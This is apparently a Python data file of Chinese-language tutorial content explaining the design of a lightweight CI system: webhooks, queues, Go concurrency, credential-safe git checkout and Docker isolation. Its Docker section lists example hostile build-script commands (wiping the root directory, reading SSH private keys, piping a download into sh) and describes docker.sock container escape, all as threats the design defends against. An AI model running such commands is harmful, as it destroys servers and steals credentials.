# -*- coding: utf-8 -*-
"""guide 内容 · 第 1 部分：站点 ①–⑧。每站 = 发生了什么 / 小白类比 / 技术细节 / 坑。"""

P1 = [

dict(id="s1", num="①", status="mixed",
 title="触发：webhook 如何做到「一推就跑」",
 sub="你敲下 git push 之后，代码变更如何变成一个构建任务",
 sections=[
  dict(type="text", body="""
<p><strong>发生了什么：</strong>你在 GitHub 仓库设置里填了一个 URL 和一个密钥。从此每次 push，
GitHub <em>主动</em>向这个 URL 发一个 HTTP POST 请求，请求体是一个 JSON，写着：谁推的、推到哪个分支、
commit 的 SHA、提交信息。</p>
<p>GoPulse 收到后做四件事：<strong>验签 → 限长 → 解析入队 → 立刻回 202</strong>。真正的构建在后台异步进行。</p>"""),

  dict(type="analogy", body="""
把 webhook 想成<strong>外卖平台的接单提醒</strong>。<br><br>
轮询（polling）= 你每隔一分钟打电话问餐厅「有我的单子吗」—— 99% 的电话都白打，而且平均要等半分钟才知道。<br>
webhook = 餐厅一有新单子就<strong>主动打你电话</strong>—— 零延迟，零无效通话。<br><br>
「hook（钩子）」的意思就是：你在别人的系统上挂了一个钩子，事情发生时它来拉你。"""),

  dict(type="table", h="轮询 vs webhook", cols=["维度", "轮询（每分钟问一次）", "webhook（事件推送）"],
   rows=[["延迟", "平均 30 秒（取决于间隔）", "<span class='yes'>毫秒级</span>"],
         ["无效请求", "99% 得到「没变化」", "<span class='yes'>0</span>"],
         ["平台侧压力", "每仓库每分钟一次", "<span class='yes'>只在真有事时一次</span>"],
         ["实现复杂度", "简单", "需要公网可达地址 + 验签"]]),

  dict(type="text", body="""
<p><strong>为什么必须验签：</strong>你的 webhook URL 是公网可访问的。<em>任何人都能往这个 URL POST 一个假 JSON</em>，
声称「某仓库刚 push 了」，然后你的系统就会去构建一个不存在的 commit，或者被恶意触发去部署。</p>
<p>防御手段是 <strong>HMAC-SHA256 签名</strong>：</p>"""),

  dict(type="flow", h="HMAC 验签原理", body="""GitHub 侧：  用【共享密钥】对【请求体原文】算一个哈希 ──▶ 放进请求头
                                                        X-Hub-Signature-256: sha256=5d41402abc...

GoPulse 侧： 用【同一个密钥】对【收到的请求体】算哈希 ──▶ 和请求头比对
                                                        │
                          ┌─────────────────────────────┴──────────────┐
                          ▼                                            ▼
                    一致 → 确实是 GitHub 发的，且内容未被篡改      不一致 → 401 直接拒绝"""),

  dict(type="kv", h="HMAC 的四个安全性质", items=[
    ("哈希不可逆", "拿到签名反推不出密钥"),
    ("密钥不上网", "网络上传输的只有哈希结果，密钥双方各自保存"),
    ("改一字节全变", "内容不可能被中途篡改而不被发现"),
    ("每项目独立密钥", "一个项目的密钥泄漏，不影响其他项目")]),

  dict(type="code", h="三个必须做的防御（缺一即漏洞）", lang="go", body="""<span class="c">// ① 限制请求体大小 —— 防止有人 POST 一个 10GB 的 JSON 撑爆内存</span>
body, _ := io.ReadAll(io.LimitReader(r.Body, <span class="n">1&lt;&lt;20</span>))   <span class="c">// 最多 1MB</span>

<span class="c">// ② 验签</span>
<span class="k">if</span> !verifyHMAC(r.Header.Get(<span class="s">"X-Hub-Signature-256"</span>), body, secret) {
    http.Error(w, <span class="s">"bad signature"</span>, http.StatusUnauthorized)
    <span class="k">return</span>
}

<span class="c">// ③ 解析成内部事件 → 入队 → 立刻应答。绝不在这里构建。</span>
queue.Enqueue(ctx, BuildRequest{RepoFullName: ev.Repository.FullName,
                                CommitSHA: ev.After, Ref: ev.Ref})
w.WriteHeader(http.StatusAccepted)   <span class="c">// 202，不是 200</span>"""),

  dict(type="warn", h="最容易被新手写错的坑：同步构建", body="""
GitHub 的 webhook 有 <strong>10 秒超时</strong>，而一次构建要几分钟。如果你在 webhook 处理函数里同步执行构建："""),

  dict(type="flow", body="""GitHub 等 10 秒 ──▶ 超时 ──▶ 认为你挂了 ──▶ 标记 webhook 失败 ──▶ 稍后重试
                                                                    │
                                        ┌───────────────────────────┘
                                        ▼
                              你又构建一次，又超时 ──▶ 无限重试风暴"""),

  dict(type="text", body="""
<p>所以必须<strong>「收到就入队，马上应答」</strong>。这正是 <code>202 Accepted</code>（而不是 <code>200 OK</code>）
的语义 —— <em>「我接受了你的请求，但还没处理完」</em>。</p>"""),

  dict(type="tip", h="幂等去重：为什么要做", body="""
网络会重试，GitHub 也会重试，同一个 push 可能收到两次 webhook。如果不去重，就会构建两遍、部署两遍。<br><br>
做法：以 <code>(commit_sha + ref)</code> 作为唯一键，短时间内重复的直接丢弃。<br>
这个性质叫<strong>幂等（idempotent）</strong>—— 同一操作执行一次和执行多次，结果相同。"""),
 ]),

dict(id="s2", num="②", status="design",
 title="入队：为什么队列必须落数据库",
 sub="任务如何被安全地暂存，以及两个 worker 同时抢一个任务怎么办",
 sections=[
  dict(type="text", body="""
<p><strong>发生了什么：</strong>解析出的信息变成一条 <code>state='queued'</code> 的构建记录写进 SQLite，
然后这次 HTTP 请求就结束了。构建本身还没开始。</p>"""),

  dict(type="analogy", body="""
<strong>餐厅的取号排队系统。</strong><br><br>
服务员（webhook 处理函数）不会站在门口给你现做一道菜 —— 他给你一张号码牌，记在本子上，然后立刻接待下一位。<br>
后厨（Worker Pool）按号码牌顺序出餐。<br><br>
<strong>关键点：号码牌写在「本子」上，不是记在服务员脑子里。</strong>
服务员换班（进程重启）了，本子还在，队列不丢。"""),

  dict(type="table", h="内存队列 vs 数据库队列", cols=["", "!内存 channel", "!数据库表"],
   rows=[["实现", "<span class='mono'>make(chan *Job, 100)</span>", "一张 builds 表 + state 字段"],
         ["进程崩溃", "<span class='no'>队列里的任务全丢</span>", "<span class='yes'>重启后继续处理</span>"],
         ["可观测性", "<span class='no'>看不见队列内容</span>", "<span class='yes'>可以直接 SQL 查</span>"],
         ["多实例扩展", "<span class='no'>做不到</span>", "<span class='yes'>天然支持</span>"],
         ["性能", "极快", "略慢，但对 CI 场景完全够用"]]),

  dict(type="text", body="""
<p><strong>为什么内存队列是致命的：</strong>CI 服务器恰恰容易崩（OOM、被 kill、机器重启）。
用内存队列的话，用户 push 了代码，界面上什么都没发生，也不知道为什么 —— 这是最糟糕的体验。
所以设计上用<strong>数据库表当队列</strong>。</p>"""),

  dict(type="code", h="部分索引：只给活跃任务建索引", lang="sql", body="""<span class="k">CREATE TABLE</span> builds (
    id         <span class="k">INTEGER PRIMARY KEY AUTOINCREMENT</span>,
    project_id <span class="k">INTEGER NOT NULL REFERENCES</span> projects(id),
    state      <span class="k">TEXT NOT NULL DEFAULT</span> <span class="s">'queued'</span>,
    commit_sha <span class="k">TEXT NOT NULL</span>,
    ...
);

<span class="c">-- 历史构建可能有几万条，但活跃的永远只有几条。</span>
<span class="c">-- 部分索引只覆盖活跃状态 → 索引小、查询快。</span>
<span class="k">CREATE INDEX</span> idx_builds_state <span class="k">ON</span> builds(state)
    <span class="k">WHERE</span> state <span class="k">IN</span> (<span class="s">'queued'</span>, <span class="s">'running'</span>, <span class="s">'deploying'</span>);"""),

  dict(type="warn", h="并发编程最经典的坑：两个 worker 抢同一个任务", body="""
假设两个 worker 同时来取任务，如果「查询」和「更新」是两步："""),

  dict(type="flow", body="""worker A:  SELECT * FROM builds WHERE state='queued' LIMIT 1   ──▶ 拿到 #100
worker B:  SELECT * FROM builds WHERE state='queued' LIMIT 1   ──▶ 也拿到 #100
                                                                    │
                                                                    ▼
                        两个 worker 都去构建 #100 ──▶ 同一 commit 构建两遍，还可能互相踩"""),

  dict(type="code", h="解法：把「查询」和「改状态」合并成一个原子操作", lang="sql", body="""<span class="c">-- SQLite：UPDATE ... RETURNING，数据库保证整条语句原子</span>
<span class="k">UPDATE</span> builds <span class="k">SET</span> state = <span class="s">'running'</span>, started_at = ?
<span class="k">WHERE</span> id <span class="k">IN</span> (
    <span class="k">SELECT</span> id <span class="k">FROM</span> builds <span class="k">WHERE</span> state = <span class="s">'queued'</span>
    <span class="k">ORDER BY</span> id <span class="k">LIMIT</span> ?
)
<span class="k">RETURNING</span> *;

<span class="c">-- PostgreSQL 的等价写法：</span>
<span class="c">-- SELECT ... FROM builds WHERE state='queued' FOR UPDATE SKIP LOCKED</span>"""),

  dict(type="tip", body="""
两个 worker 同时执行这条语句，数据库保证<strong>只有一方的 UPDATE 真正影响到那一行</strong>。
「谁改成功了，任务就是谁的。」—— 不需要应用层加锁，把并发控制交给数据库。"""),

  dict(type="warn", h="同项目串行化：一个更隐蔽的竞态", body="""
同一项目的两个构建如果并行部署，会出现<strong>旧版本覆盖新版本</strong>："""),

  dict(type="flow", body="""web-api 项目的 #100（v1.0）和 #101（v1.1）同时部署：

  #100 部署 v1.0 ─────────────────────────▶ 完成（较慢）
  #101 部署 v1.1 ──────▶ 完成（较快）
                          │
                          └──▶ 此刻线上是 v1.1 ✓
                                                    │
                                                    ▼
                              #100 后完成 ──▶ 线上变成 v1.0 ✗ 旧版本覆盖了新版本"""),

  dict(type="text", body="""
<p><strong>解法：</strong>调度器按 <code>project_id</code> 分组 —— <em>同一项目一次只放行一个构建，不同项目之间可以并行</em>。
这样既保证了正确性，又保留了并发能力。</p>"""),
 ]),

dict(id="s3", num="③", status="design",
 title="并发调度：Go 的看家本领",
 sub="goroutine、信号量限流、背压、context —— 四个概念讲透",
 sections=[
  dict(type="text", body="""
<p>这一节是整个项目<strong>技术含量最高的部分</strong>，也是选 Go 的理由。</p>"""),

  dict(type="analogy", body="""
<strong>goroutine = 轻量级的「工人」。</strong><br><br>
Java 线程像一个正式员工：招一个要几 MB 的「办公空间」（内存），公司养几千个就吃不消了。<br>
goroutine 像临时工：只要几 KB，一个程序里开几十万个都没问题。<br><br>
在 Go 里让一个函数后台并发执行，只需要在调用前加一个关键字：
<code style="background:#1a2743">go doSomething()</code> —— 就这么简单。<br><br>
CI 系统的本质就是「同时管很多个正在跑的任务」，正好是 goroutine 的主场。"""),

  dict(type="analogy", body="""
<strong>信号量（semaphore）= 停车场的车位。</strong><br><br>
不能无限并发：每个构建要起一个 Docker 容器，容器吃内存、吃 CPU、吃磁盘。
50 个人同时 push 就起 50 个容器，构建机当场 OOM 死机。<br><br>
所以停车场只有 4 个车位（<code>max_concurrency = 4</code>）：
车来了有空位就进，没空位在门口排队；车走了腾出一位，放下一辆进来。"""),

  dict(type="code", h="Go 里用带缓冲 channel 实现信号量 —— 简洁到令人发指", lang="go", body="""<span class="k">type</span> Pool <span class="k">struct</span> {
    sem  <span class="k">chan struct</span>{}      <span class="c">// 容量 = 4，就是 4 个车位</span>
    jobs &lt;-<span class="k">chan</span> *BuildJob
    wg   sync.WaitGroup
}

<span class="k">func</span> (p *Pool) Run(ctx context.Context) {
    <span class="k">for</span> job := <span class="k">range</span> p.jobs {
        p.sem &lt;- <span class="k">struct</span>{}{}        <span class="c">// 占一个车位。满了就阻塞在这里等</span>

        p.wg.Add(<span class="n">1</span>)
        <span class="k">go func</span>(j *BuildJob) {
            <span class="k">defer</span> p.wg.Done()
            <span class="k">defer func</span>() { &lt;-p.sem }()   <span class="c">// 干完了，腾出车位</span>
            p.execute(ctx, j)
        }(job)
    }
}"""),

  dict(type="tip", h="两个 Go 惯用技巧", body="""
<strong>① <code>struct{}{}</code> 是空结构体，占 0 字节内存</strong> —— 纯粹用来计数，是 Go 里实现信号量的标准做法。<br><br>
<strong>② <code>go func(j *BuildJob){...}(job)</code> 末尾那个 <code>(job)</code> 不能省</strong> ——
必须把循环变量作为参数传进去。否则所有 goroutine 会共享同一个变量，最后全部执行最后一个任务。
这是 Go 并发最经典的 bug（Go 1.22 已修复循环变量语义，但显式传参仍是好习惯）。"""),

  dict(type="text", body="""
<p><strong>背压（Backpressure）</strong>是个很重要的概念：<em>当下游处理不过来时，把压力反向传导回上游，让上游慢下来。</em>
在这个系统里，压力是这样一层层传导的：</p>"""),

  dict(type="flow", h="背压链条：系统如何自我保护", body="""车位满了（4 个都在跑）
   │
   ▼  新任务进不了 pool
堆在队列里
   │
   ▼  队列也满了（queue_capacity = 200）
Enqueue 返回错误
   │
   ▼
webhook 处理函数返回 503 Service Unavailable
   │
   ▼
GitHub 收到 503，知道「对方忙」──▶ 稍后自动重试
   │
   └──▶ 【妙处】你什么都不用做，GitHub 自己帮你排队"""),

  dict(type="warn", body="""
<strong>反面教材：</strong>队列满了还硬塞进内存（比如用无界 slice），最后 OOM 崩溃 —— 所有任务全丢。<br><br>
原则：<strong>宁可拒绝，不可崩溃。</strong> 503 的语义就是「我现在忙，你等会儿再来」，各大平台都会正确处理它。"""),

  dict(type="text", body="""
<p><strong>context：超时与取消的传递。</strong>Go 里所有可能「卡住」的操作都要传一个 <code>context</code>。
它像一根<em>贯穿整个调用链的绳子</em>，你一拉，链上所有环节同时知道「该停了」。</p>"""),

  dict(type="code", lang="go", body="""ctx, cancel := context.WithTimeout(parentCtx, <span class="n">30</span>*time.Minute)
<span class="k">defer</span> cancel()

<span class="c">// 这个 ctx 一路传给：Docker 创建容器、SSH 连接、HTTP 调 LLM……</span>
<span class="c">// 30 分钟一到，或用户点了「中止运行」，所有环节同时收到取消信号</span>"""),

  dict(type="text", body="""
<p><strong>为什么必须有超时：</strong>网络会挂、Docker daemon 会卡死、SSH 会遇到永不响应的主机。
<em>没有超时的阻塞调用 = 永久泄漏一个 goroutine = 内存只增不减。</em></p>"""),

  dict(type="table", h="六条并发铁律（每条都是真会踩的坑）", cols=["#", "铁律", "违反的后果"],
   rows=[["!1", "每个 goroutine 都要有明确退出路径（channel 关闭或 ctx 取消）", "goroutine 泄漏，内存持续上涨"],
         ["!2", "谁创建 channel 谁关闭，且只在<strong>发送方</strong>关闭", "panic: close of closed channel"],
         ["!3", "不要持锁做 IO", "一个慢请求阻塞所有其他请求"],
         ["!4", "所有阻塞 IO 带 ctx 和超时（Docker / SSH / HTTP 都会挂住）", "永久挂起"],
         ["!5", "<strong>清理逻辑用独立 context</strong>", "容器泄漏，磁盘被塞满（见下）"],
         ["!6", "全程 <span class='mono'>go test -race</span>", "并发 bug 靠肉眼永远找不出来"]]),

  dict(type="code", h="铁律 5 展开：最隐蔽也最反直觉的一条", lang="go", body="""<span class="bad">// ❌ 错误写法</span>
<span class="k">defer</span> docker.ContainerRemove(ctx, id, ...)

<span class="c">// 为什么错：如果 ctx 是因为「超时」或「用户取消」而失效的，</span>
<span class="c">// 那这个 defer 里的删除操作也会立刻失败 ──▶ 容器永久泄漏在宿主机上</span>
<span class="c">// 跑上几百次构建，磁盘被废弃容器塞满，而且很难查出来</span>

<span class="good">// ✅ 正确写法</span>
<span class="k">defer</span> docker.ContainerRemove(context.WithoutCancel(ctx), id, ...)
<span class="c">// 语义：「不管前面为什么取消，清理动作必须做完」</span>"""),
 ]),

dict(id="s4", num="④", status="design",
 title="检出代码：git 凭据的安全处理",
 sub="私有仓库怎么拉代码，且保证 token 绝不泄漏进日志",
 sections=[
  dict(type="text", body="""
<p><strong>发生了什么：</strong>系统要把你的代码从 GitHub 拉到本地。公开仓库直接 clone 就行，
<em>私有仓库需要凭据</em>（不然 GitHub 不给你代码）。</p>"""),

  dict(type="analogy", body="""
<strong>把代码「取快递」和「拆快递」分给两个人做。</strong><br><br>
取件员（Go 进程）持有你的取件码，去柜台把包裹取出来。<br>
拆件员（构建容器）只拿到已经取出的包裹，<strong>他根本不知道取件码是什么</strong>。<br><br>
这样即使拆件员是坏人（恶意构建脚本），他也偷不到你的取件码。"""),

  dict(type="warn", h="核心安全决策：凭据绝不进容器", body="""
这一点是整个 git 集成里最重要的设计。"""),

  dict(type="flow", body="""❌ 危险做法：把 token 塞进构建容器的环境变量

   用户的构建脚本里只要写一句 `env` 或 `printenv`
        │
        ▼
   token 出现在构建日志里
        │
        ▼
   日志能在网页上看，还可能被发给 LLM 分析
        │
        ▼
   token 泄漏 ──▶ 别人能读你所有私有仓库


✅ 实际做法：Go 进程自己 clone，容器只拿到代码

   Go 侧：git clone（用凭据）──▶ 得到 workspace 目录
   容器：  把这个目录【只读挂载】进去 ──▶ 容器里根本没有凭据这个东西"""),

  dict(type="tip", h="「只读挂载」的额外好处", body="""
<code>:ro</code>（read-only）意味着构建脚本能读代码，但<strong>改不了</strong>。
防止构建过程偷偷篡改仓库内容，产物写到单独的 <code>/output</code> 目录。"""),

  dict(type="table", h="凭据传给 git 的三种方式，安全性天差地别", cols=["做法", "问题"],
   rows=[["写进 URL：<span class='mono'>https://TOKEN@github.com/...</span>",
          "<span class='no'>❌ token 被永久写入 <span class='mono'>.git/config</span> 文件；出现在进程列表 <span class='mono'>ps aux</span> 里；还会被打进日志</span>"],
         ["命令行参数 <span class='mono'>--config http.extraHeader=...</span>",
          "<span class='no'>❌ 同样出现在 <span class='mono'>ps aux</span> 里，同机器其他用户能看到</span>"],
         ["<strong>环境变量 <span class='mono'>GIT_CONFIG_COUNT</span></strong>",
          "<span class='yes'>✅ 只存在于这个子进程的环境块里，<strong>不落盘、不出现在命令行、进程结束即消失</strong></span>"]]),

  dict(type="code", h="git 2.31+ 提供的机制：环境变量式临时配置", lang="bash", body="""<span class="k">export</span> GIT_CONFIG_COUNT=<span class="n">2</span>
<span class="k">export</span> GIT_CONFIG_KEY_0=http.h...ader
<span class="k">export</span> GIT_CONFIG_VALUE_0=<span class="s">"AUTHORIZATI…oken ghp_xxx"</span>
<span class="k">export</span> GIT_CONFIG_KEY_1=credential.helper
<span class="k">export</span> GIT_CONFIG_VALUE_1=              <span class="c"># 清空，避免 git 去找系统凭据管理器</span>

git clone https://github.com/acme/web-api.git

<span class="c"># 另外两个必须设置的：</span>
<span class="k">export</span> GIT_TERMINAL_PROMPT=<span class="n">0</span>   <span class="c"># 凭据错误时 git 默认会弹交互式提示等输密码</span>
                              <span class="c"># 在无人值守的 CI 里这会【永久卡住】── 必须关掉</span>
git fetch -q                    <span class="c"># 静默模式，减少 token 意外出现在输出里的机会</span>"""),

  dict(type="tip", h="这个机制是实测验证过的，不是「据说」", body="""
在本机 git 2.45.1 上实测确认三件事：<br>
① 注入的值能被 <code>git config --get</code> 读到；<br>
② <strong>不会写进 <code>.git/config</code></strong>（检查过文件内容）；<br>
③ unset 环境变量后回落到全局值。<br><br>
所以文档里写的是「已实测」。<em>架构文档里的技术断言都要求可溯源，这是本项目的一条硬规则。</em>"""),

  dict(type="text", body="""
<p><strong>为什么按 commit SHA 检出，而不是按分支名</strong> —— 这是可复现性的关键：</p>"""),

  dict(type="flow", h="按分支名检出的陷阱", body="""webhook 说：分支 main 上有新提交 a3f9c21

❌ 如果执行 git clone -b main
     ──▶ 拿到的是「此刻 main 的最新提交」
     ──▶ 但在 webhook 到达和构建开始之间，可能又有人 push 了新提交
     ──▶ 你构建的其实不是 a3f9c21，而是别的 commit
     ──▶ 界面上显示 a3f9c21，实际构建的是另一个 ──▶ 这是【欺诈】

✅ 正确做法：精确检出 a3f9c21
     git fetch --depth=1 origin a3f9c21
     git checkout FETCH_HEAD
     ──▶ 「你看到的 SHA 就是你构建的 SHA」"""),

  dict(type="text", body="""
<p><code>--depth=1</code> 是<strong>浅克隆</strong>：只拉最新一层，不拉整个历史。
一个大仓库的完整历史可能有几个 GB，浅克隆只要几十 MB —— 对小团队省时省盘。</p>
<p>GitHub 支持按任意历史 SHA 浅 fetch（已用 <code>octocat/Hello-World</code> 的非分支尖端提交实测）。
GitLab 侧没测到，所以设计里带了<strong>回退链</strong>：</p>"""),

  dict(type="flow", h="带回退的可移植检出策略", body="""git fetch --depth=1 origin &lt;sha&gt;
        │
   成功 ├──────────────────────────▶ git checkout FETCH_HEAD ──▶ 继续构建
        │
   失败 ▼（服务器不支持按 SHA fetch）
git fetch --depth=1 origin &lt;ref&gt; + git checkout &lt;sha&gt;
        │
   成功 ├──────────────────────────▶ 继续构建
        │
   失败 ▼
标记 failed，错误分类 = git_auth
        │
        └──▶ 【绝不静默用分支最新代码】宁可失败，也不能悄悄构建错误的版本"""),

  dict(type="table", h="检出失败必须分类 —— 因为处理策略完全不同", cols=["错误特征", "分类", "可否自动重试", "LOA 档位"],
   rows=[["401 / 403", "!git_auth", "<span class='no'>不可</span>（重试也没用，要人改配置）", "!4 人批准"],
         ["超时 / 连接被拒 / DNS 解析失败", "!transient_network", "<span class='yes'>可</span>", "!7 自动重试"]]),

  dict(type="text", body="""
<p>这个分类会喂给后面的 <strong>LOA 策略引擎</strong>（见第 ⑫ 站）—— 网络抖动可以自动重试，
凭据错误必须人来处理。<em>「机器做机械的事，人做判断的事」在这里第一次体现。</em></p>"""),
 ]),

dict(id="s5", num="⑤", status="design",
 title="类型检测：为什么能做到「零配置」",
 sub="扫一眼仓库根目录，就知道该怎么构建它",
 sections=[
  dict(type="text", body="""
<p><strong>发生了什么：</strong>系统扫描仓库根目录，靠<strong>标记文件</strong>推断这是什么项目，
然后生成对应的构建命令序列。</p>"""),

  dict(type="analogy", body="""
<strong>看厨房里的家伙什，就知道这家人做什么菜。</strong><br><br>
看见炒锅和菜刀 → 中餐；看见烤箱和量杯 → 烘焙；看见寿司帘 → 日料。<br>
你不用问，看一眼工具就知道了。<br><br>
项目也一样：<code>package.json</code> 就是 Node 项目的「炒锅」，
<code>go.mod</code> 就是 Go 项目的「寿司帘」。"""),

  dict(type="table", h="检测规则表（internal/build/detect.go）", 
   cols=["探测文件", "推断类型", "Base Image", "默认命令"],
   rows=[["!Dockerfile", "docker（用户自己控制）", "—", "!docker build -t $IMAGE ."],
         ["!package.json", "Node.js", "!node:20-alpine", "!npm ci → npm run build"],
         ["!pnpm-lock.yaml", "Node (pnpm)", "!node:20-alpine", "!pnpm i --frozen-lockfile && pnpm build"],
         ["!go.mod", "Go", "!golang:1.22-alpine", "!go build ./..."],
         ["!requirements.txt", "Python", "!python:3.12-slim", "!pip install -r requirements.txt"],
         ["!pyproject.toml", "Python (poetry)", "!python:3.12-slim", "!poetry install"],
         ["!pom.xml", "Java (Maven)", "!maven:3.9-temurin-21", "!mvn -B package"],
         ["!build.gradle", "Java (Gradle)", "!gradle:8-jdk21", "!gradle build"],
         ["!Cargo.toml", "Rust", "!rust:1.78-alpine", "!cargo build --release"],
         ["!composer.json", "PHP", "!composer:2", "!composer install --no-dev"],
         ["全都不匹配", "unknown", "!alpine:3.20", "报错，要求用户手写 pipeline"]]),

  dict(type="tip", h="原理：约定优于配置（Convention over Configuration）", body="""
与其让用户写一堆配置，不如<strong>猜</strong> —— 猜对了就省事，猜错了允许改。<br><br>
这是这个项目「轻量」卖点的核心：<br>
&nbsp;&nbsp;• Jenkins 要你装插件、写 Jenkinsfile、配一堆东西<br>
&nbsp;&nbsp;• GoPulse 是<strong>连上仓库就能跑</strong><br><br>
<em>注意规则有优先级：</em><code>Dockerfile</code> 优先级最高 —— 有它就说明用户明确想自己控制构建。
一个 Node 项目也可能有 Dockerfile，这时应该听 Dockerfile 的。"""),

  dict(type="text", body="""
<p><strong>Pipeline 快照</strong>是我认为设计上最漂亮的一处。检测出的命令序列，
会<em>存成快照写进这次构建的记录里</em>：</p>"""),

  dict(type="code", lang="sql", body="""<span class="k">CREATE TABLE</span> builds (
    ...
    pipeline_json  <span class="k">TEXT</span>,   <span class="c">-- 本次实际执行的步骤（快照）</span>
    base_image     <span class="k">TEXT</span>,   <span class="c">-- 本次用的镜像</span>
);"""),

  dict(type="warn", h="为什么必须存快照，而不是每次现算", body=""""""),

  dict(type="flow", body="""三月：构建 #100，当时检测规则说 Node 项目跑 `npm ci`
五月：你改了检测规则，改成 `npm ci && npm run lint`
六月：回头看 #100 的构建记录

❌ 如果现算：界面显示 #100 跑了 `npm ci && npm run lint`
   ──▶ 但它当时其实没跑 lint！【你在骗自己】

✅ 存快照：  界面显示 #100 跑了 `npm ci`
   ──▶ 这就是当时真实发生的事"""),

  dict(type="text", body="""
<p><strong>「历史记录必须反映历史事实」</strong> —— 这个原则在任何有审计需求的系统里都成立。
它也是论文里能讲的一个设计亮点：<em>检测规则可以演进，历史构建永远可复现。</em></p>"""),
 ]),

dict(id="s6", num="⑥", status="design",
 title="Docker 构建：隔离的原理",
 sub="为什么构建脚本等于「任意代码执行」，以及怎么把它关进笼子",
 sections=[
  dict(type="analogy", body="""
<strong>容器 = 一个打包好的、和你机器隔离的迷你 Linux。</strong><br><br>
想象一个魔法盒子：里面装着一个完整的 Linux，预装了 Node.js 20。
你把代码丢进去，在盒子里执行命令，<strong>盒子外你的电脑完全不受影响</strong>。
盒子用完就扔掉，下次再拿一个全新的。<br><br>
和虚拟机的区别：虚拟机模拟整个硬件（重，启动几十秒）；
容器<strong>共享宿主机内核</strong>（轻，启动几百毫秒）。"""),

  dict(type="table", h="为什么必须用容器 —— 三个真实痛点", cols=["理由", "没有容器会怎样", "有容器之后"],
   rows=[["<strong>环境一致</strong>",
          "你笔记本装了 Node 20 和某个全局 sass 编译器，构建服务器只有 Node 18 → 同样代码本地成功、服务器失败 → 花两小时排查发现是环境差异",
          "每次都从 <span class='mono'>node:20-alpine</span> 这个<strong>完全相同的镜像</strong>开始 → 本地跑同一镜像，行为一致"],
         ["<strong>安全</strong>",
          "构建脚本可以在服务器上执行任意命令（详见下方）",
          "恶意操作被关在容器里，宿主机不受影响"],
         ["<strong>可复现</strong>",
          "上次构建留下的 <span class='mono'>node_modules</span>、临时文件、缓存都会影响这次",
          "每次全新 → <strong>同样的代码 + 同样的镜像 = 同样的结果</strong>"]]),

  dict(type="warn", h="很多人没意识到：构建脚本 = 任意代码执行", body="""
你让系统执行用户的 <code>npm run build</code>，<strong>就等于让用户在你的服务器上执行任意命令</strong>。
恶意（或不小心）的构建脚本可以："""),

  dict(type="flow", body="""rm -rf /                    ──▶ 删掉你的服务器
cat ~/.ssh/id_rsa           ──▶ 偷走你的 SSH 密钥
curl 恶意地址 | sh           ──▶ 装后门
跑挖矿程序                   ──▶ 吃满 CPU

容器把这些关在笼子里：
  · 容器内的 rm -rf / 只删容器自己的文件
  · 容器内看不到宿主机的 ~/.ssh（除非你主动挂载进去）"""),

  dict(type="warn", h="还有一条更狠的防御：容器不挂 Docker socket", body=""""""),

  dict(type="flow", body="""❌ 危险：把 /var/run/docker.sock 挂进构建容器

   容器里的代码可以通过这个 socket 控制【宿主机的 Docker】
        │
        ▼
   它可以起一个【特权容器】，挂载宿主机根目录
        │
        ▼
   完全逃逸 ──▶ 等于拿到了宿主机 root

✅ 本设计：所有 Docker 操作由【外层的 Go 进程】做
          容器里只有代码和工具链，碰不到 Docker"""),

  dict(type="code", h="挂载配置：注意 :ro 后缀", lang="go", body="""HostConfig: &amp;container.HostConfig{
    Binds: []<span class="k">string</span>{
        workspace + <span class="s">":/workspace:ro"</span>,   <span class="c">// 代码目录，ro = read-only 只读</span>
        outputDir + <span class="s">":/output"</span>,         <span class="c">// 产物目录，可写</span>
    },
    NetworkMode: <span class="s">"bridge"</span>,
},

<span class="c">// 创建容器</span>
resp, err := docker.ContainerCreate(ctx, &amp;container.Config{
    Image: steps.BaseImage,
    Cmd:   []<span class="k">string</span>{<span class="s">"sh"</span>, <span class="s">"-c"</span>, steps.Script},
    Env:   job.Secrets.AsEnv(),       <span class="c">// 只注入【必要】的 secret，不是全部</span>
}, hostConfig, <span class="k">nil</span>, <span class="k">nil</span>, <span class="s">"build-"</span>+jobID)

<span class="c">// 清理必须用独立 context（并发铁律 5）</span>
<span class="k">defer</span> docker.ContainerRemove(context.WithoutCancel(ctx), resp.ID, ...)"""),

  dict(type="text", body="""
<p><strong>判定成败：退出码是唯一真相。</strong>这是整个 CI 系统最朴素也最核心的机制。</p>"""),

  dict(type="table", h="exit code 的含义", cols=["!退出码", "含义", "系统动作"],
   rows=[["!0", "成功", "阶段 passed，继续下一阶段"],
         ["!非 0", "失败（不同数字有不同含义，但 CI 只关心「是不是 0」）", "阶段 failed，<strong>后续阶段全部 skipped</strong>"],
         ["!137", "被 SIGKILL 杀掉（通常是 OOM 或超时）", "标记 timeout / oom"],
         ["!143", "被 SIGTERM 终止（通常是主动取消）", "标记 cancelled"]]),

  dict(type="tip", h="这个「委托」关系是 CI 能通用于任何语言的原因", body="""
GoPulse <strong>不理解</strong>你的代码，不理解 pytest 的断言，不理解 TypeScript 的类型系统 ——
它<strong>只看退出码</strong>。<br><br>
测试框架自己负责把结果翻译成退出码，CI 只负责「在一致的环境里执行」和「读码判定」。<br><br>
所以同一套系统能支持 Node、Go、Python、Java、Rust…… <em>它不需要懂任何一种语言。</em>"""),

  dict(type="warn", h="当前设计的一个真实缺口（诚实说明）", body="""
现在的 6 个阶段是 <code>检出代码 → 安装依赖 → 执行构建 → 生成产物 → 部署 → 健康检查</code>，
<strong>没有独立的「执行测试」阶段</strong>。<br><br>
测试是通过「执行构建」间接发生的 —— 因为那一步跑的是项目自己 <code>package.json</code> 里的 build 脚本，
如果用户在脚本里链了测试（<code>"build": "vitest run &amp;&amp; tsc -b"</code>），测试就会跑，退出码照样决定成败。<br><br>
<em>机制上完全支持测试，只是没有把它单独拎出来成一个阶段。</em>
单独拎出来的价值在于<strong>失败归因</strong>（测试失败 vs 编译失败是两类问题，需要不同的 analyzer 和不同的自动化档位）
和<strong>独立计时</strong>。"""),
 ]),

dict(id="s7", num="⑦", status="mixed",
 title="日志管道：实时推送的原理",
 sub="容器里输出一行，浏览器上立刻看到 —— 中间发生了什么",
 sections=[
  dict(type="text", body="""
<p><strong>技术选型：为什么用 SSE 不用 WebSocket。</strong></p>"""),

  dict(type="table", cols=["", "!SSE (Server-Sent Events)", "!WebSocket"],
   rows=[["方向", "单向：服务器 → 浏览器", "双向"],
         ["协议", "<span class='yes'>就是普通 HTTP</span>", "需要协议升级握手"],
         ["断线重连", "<span class='yes'><strong>浏览器自动重连</strong>，还带 Last-Event-ID</span>", "要自己写重连逻辑"],
         ["代理/防火墙兼容", "<span class='yes'>好（就是 HTTP）</span>", "有时被拦"],
         ["实现复杂度", "<span class='yes'>极低，连库都不需要</span>", "中等"],
